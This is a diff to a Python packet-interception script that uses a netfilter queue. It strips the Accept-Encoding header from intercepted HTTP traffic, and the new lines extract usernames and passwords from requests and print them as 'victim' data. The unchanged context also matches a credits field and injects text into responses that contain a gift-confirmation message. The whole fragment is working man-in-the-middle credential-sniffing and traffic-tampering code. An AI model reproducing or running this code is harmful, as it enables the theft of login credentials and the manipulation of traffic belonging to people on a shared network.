@@ -28,10 +28,16 @@ def process_packet(packet):
                 # forward the packet exit the function
                 packet.accept()
                 return
-     
+     	
             # remove Accept-Encoding header from the HTTP request
             new_load = re.sub(r"Accept-Encoding:.*\r\n", "", load)
-          
+            if '&password=' in new_load:
+            	splitusername = new_load.split('username=')
+            	victim = 'username='+splitusername[1]
+            	print("\n"+10*"-------------------"+"\n")
+            	print(victim)
+            	print("\n"+10*"-------------------"+"\n")
+            	
             if '&credits=' in new_load:
             	split = new_load.split('username=')
             	victim = 'username='+split[1]
@@ -59,6 +65,7 @@ def process_packet(packet):
             except:
                 packet.accept()
                 return
+                
             new_load = re.sub(r"Accept-Encoding:.*\r\n", "", load)
             added_text = ''
             if "Your gift has been sent!" in new_load:
@@ -96,3 +103,4 @@ if __name__ == "__main__":
     queue.bind(0, process_packet)
     # start the filter queue
     queue.run()
+
